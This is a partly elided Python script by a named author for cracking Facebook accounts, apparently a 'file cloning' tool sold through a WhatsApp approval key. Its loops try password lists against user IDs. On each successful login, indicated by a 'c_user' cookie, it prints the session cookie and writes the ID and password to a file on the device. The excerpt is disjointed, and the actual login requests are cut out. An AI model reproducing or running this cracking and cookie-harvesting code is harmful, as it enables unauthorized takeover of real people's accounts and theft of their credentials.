#RS(KING-RAYHAN)(RAYHAN AHMED)
#WhatsApp : 01300558774
#Github : RAYHAN-6T9
#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By RS")
...
for xd in range(3005):
    ...
    uas.append(ff)
for RAYHAN in range(9993,176281):
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/RAYHAN-6T9/FILE-CLONING/blob/main/file.txt').text
...
| '--------------' || '--------------' |
 '----------------'  '----------------' 
    ...
    │ [✓] AUTHOR   : RAYHAN AHMED           │
    │ [✓] GITHUB     : RAYHAN-6T9               │
    │ [✓] WHATSAPP : +8801300558774        │
    │ [✓] VERSION  : 0.1                   │
    │ [✓] TOOLS    : \033[1;32m FREE  \033[1;37m│
    └───────────────────────────────────────┘""")
  print(f"\t \033[1;32m Admin By RAYHAN AHMED \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Best Paid Tools Of RAYHAN AHMED  \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Whatsapps Number +8801300558774\033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/Rayhan.Official.55')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/RAYHAN-6T9/FILE-CLONING/blob/main/file.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801300558774?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801300558774');time.sleep(1)
		admin()
	if bal =='2':
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mRAYHAN\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [RAYHAN-OK] '+cid+' | '+ps+'\33[0;92m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RAYHAN-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/RAYHAN-OK.txt', 'a').write(cid+' | '+pm+'\n')
                break
            else:
                continue
        loop+=1        
